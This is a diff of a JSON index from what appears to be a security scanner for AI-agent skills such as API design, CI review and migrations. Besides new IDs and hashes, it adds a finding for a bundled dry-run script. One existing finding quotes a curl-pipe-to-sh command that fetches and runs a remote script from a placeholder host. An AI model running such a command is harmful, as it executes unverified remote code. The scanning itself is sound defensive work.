@@ -1,14 +1,14 @@
 {
-  "sourceId": "aa1893d04afe",
-  "snapshot": "5ff9836d17aa8dcfa348fa946e8091993a7a7c7c",
+  "sourceId": "fcb2967e53c2",
+  "snapshot": "7bb83d257600765f65d17ca8df6659d76c0a3a70",
   "name": null,
   "owner": null,
   "description": null,
   "contact": null,
   "items": [
     {
-      "key": "aa1893d04afe/api-design",
-      "sourceId": "aa1893d04afe",
+      "key": "fcb2967e53c2/api-design",
+      "sourceId": "fcb2967e53c2",
       "id": "api-design",
       "kind": "skill",
       "title": "API design",
@@ -56,8 +56,8 @@
       "complete": true
     },
     {
-      "key": "aa1893d04afe/ci-review",
-      "sourceId": "aa1893d04afe",
+      "key": "fcb2967e53c2/ci-review",
+      "sourceId": "fcb2967e53c2",
       "id": "ci-review",
       "kind": "skill",
       "title": "CI review",
@@ -99,8 +99,8 @@
       "complete": true
     },
     {
-      "key": "aa1893d04afe/migrations",
-      "sourceId": "aa1893d04afe",
+      "key": "fcb2967e53c2/migrations",
+      "sourceId": "fcb2967e53c2",
       "id": "migrations",
       "kind": "skill",
       "title": "Migrations",
@@ -167,14 +167,23 @@
           "line": 2,
           "detail": "curl -fsSL https://example.invalid/tool.sh | sh",
           "more": 0
+        },
+        {
+          "kind": "bundledCode",
+          "severity": "info",
+          "summary": "Comes with code an agent could run",
+          "path": "plugins/payments/skills/migrations/scripts/dry-run.sh",
+          "line": null,
+          "detail": null,
+          "more": 1
         }
       ],
       "calls": [],
       "complete": true
     },
     {
-      "key": "aa1893d04afe/wrangler",
-      "sourceId": "aa1893d04afe",
+      "key": "fcb2967e53c2/wrangler",
+      "sourceId": "fcb2967e53c2",
       "id": "wrangler",
       "kind": "skill",
       "title": "Wrangler",
